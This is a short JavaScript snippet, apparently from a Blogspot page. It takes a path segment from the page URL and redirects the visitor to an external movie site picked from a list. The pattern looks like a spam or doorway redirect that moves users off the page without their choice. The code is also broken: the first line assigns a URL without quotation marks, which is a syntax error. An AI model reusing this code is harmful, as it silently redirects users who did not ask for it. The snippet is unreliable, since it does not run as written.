var urlmain = https://kempelajonk.blogspot.com/;
var param = document.URL.split("/")[3].replace("?m=1","").replace("?m=0","");
var dataUrl = ["https://dev-ultimatemovie.pantheonsite.io/"];
var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
window.location = randomItem + param;
